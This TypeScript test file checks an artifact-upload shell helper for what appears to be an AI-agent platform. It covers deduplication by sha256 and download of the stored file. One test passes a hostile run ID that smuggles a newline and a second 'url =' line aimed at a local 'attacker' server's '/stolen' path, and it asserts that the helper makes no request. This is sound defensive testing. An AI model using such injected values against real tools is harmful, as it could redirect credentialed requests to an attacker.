import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import { writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import path from "node:path";
import { promisify } from "node:util";
import { eq } from "drizzle-orm";
import { agents, assets, heartbeatRuns, issueAttachments, issueWorkProducts } from "@paperclipai/db";
import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
import { createLocalAgentJwt } from "../agent-auth-jwt.js";
import { startRunnerApiTestServer } from "./helpers/runner-api-server.js";

const execFileAsync = promisify(execFile);
const helper = path.resolve(import.meta.dirname, "../../../skills/paperclip/scripts/paperclip-upload-artifact.sh");

async function listenCounter() {
  let count = 0;
  const server = createServer((_req, res) => {
    count += 1;
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end("{}");
  });
  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", resolve));
  const address = server.address();
  if (!address || typeof address === "string") throw new Error("Missing HTTP listener");
  return {
    url: `http://127.0.0.1:${address.port}`,
    requests: () => count,
    close: () => new Promise<void>((resolve, reject) => server.close((error) => error ? reject(error) : resolve())),
  };
}

describe("artifact uploader against real Paperclip HTTP and test database", () => {
  let server: Awaited<ReturnType<typeof startRunnerApiTestServer>>;

  beforeAll(async () => {
    vi.stubEnv("PAPERCLIP_AGENT_JWT_SECRET", "isolated-artifact-uploader-test-secret");
    server = await startRunnerApiTestServer();
  }, 90_000);

  afterAll(async () => {
    await server?.close();
    vi.unstubAllEnvs();
  });

  it("uploads once, reuses its sha256 match, and leaves no request from a hostile run id", async () => {
    const fixture = await server.fixture({ apiToolsEnabled: false });
    await server.db.update(agents).set({ adapterType: "codex_local" }).where(eq(agents.id, fixture.agentId));
    await server.db.update(heartbeatRuns).set({ runtimeMode: "legacy" }).where(eq(heartbeatRuns.id, fixture.runId));
    const token = createLocalAgentJwt(fixture.agentId, fixture.companyId, "codex_local", fixture.runId);
    expect(token).toBeTruthy();

    const file = path.join(fixture.workspace, "artifact.txt");
    const bytes = Buffer.from("real HTTP artifact upload\n");
    await writeFile(file, bytes);
    const baseEnv = {
      PATH: process.env.PATH ?? "",
      HOME: fixture.workspace,
      PAPERCLIP_API_URL: server.apiUrl,
      PAPERCLIP_API_KEY: token!,
      PAPERCLIP_RUN_ID: fixture.runId,
      PAPERCLIP_COMPANY_ID: fixture.companyId,
      PAPERCLIP_TASK_ID: fixture.issueId,
      PAPERCLIP_HELPER_STATE_DIR: path.join(fixture.workspace, "uploader-state"),
    };
    const run = async (env = baseEnv) => {
      const { stdout } = await execFileAsync("bash", [helper, file, "--content-type", "text/plain", "--output", "json"], {
        env, timeout: 30_000,
      });
      return JSON.parse(stdout) as {
        attachment: { id: string; contentPath: string; sha256: string; originatingRunId: string };
        workProduct: { id: string };
      };
    };

    const first = await run();
    const repeated = await run();
    expect(repeated.attachment.id).toBe(first.attachment.id);
    expect(repeated.workProduct.id).toBe(first.workProduct.id);
    expect(first.attachment.originatingRunId).toBe(fixture.runId);
    const sha256 = createHash("sha256").update(bytes).digest("hex");
    expect(first.attachment.sha256).toBe(sha256);

    const attachments = await server.db.select().from(issueAttachments).where(eq(issueAttachments.issueId, fixture.issueId));
    const products = await server.db.select().from(issueWorkProducts).where(eq(issueWorkProducts.issueId, fixture.issueId));
    const storedAssets = await server.db.select().from(assets).where(eq(assets.companyId, fixture.companyId));
    expect(attachments).toHaveLength(1);
    expect(products).toHaveLength(1);
    expect(storedAssets.some((asset) => asset.sha256 === sha256)).toBe(true);

    const downloaded = await fetch(server.apiUrl + first.attachment.contentPath, {
      headers: { Authorization: `Bearer ${token}`, "X-Paperclip-Run-Id": fixture.runId },
    });
    expect(downloaded.status).toBe(200);
    expect(Buffer.from(await downloaded.arrayBuffer())).toEqual(bytes);

    const target = await listenCounter();
    const attacker = await listenCounter();
    try {
      const hostileRunId = `run"\nurl = "${attacker.url}/stolen`;
      await expect(run({ ...baseEnv, PAPERCLIP_API_URL: target.url, PAPERCLIP_RUN_ID: hostileRunId }))
        .rejects.toThrow();
      expect(target.requests()).toBe(0);
      expect(attacker.requests()).toBe(0);
      expect(await server.db.select().from(issueAttachments).where(eq(issueAttachments.issueId, fixture.issueId)))
        .toHaveLength(1);
      expect(await server.db.select().from(issueWorkProducts).where(eq(issueWorkProducts.issueId, fixture.issueId)))
        .toHaveLength(1);
    } finally {
      await Promise.all([target.close(), attacker.close()]);
    }
  }, 90_000);
});
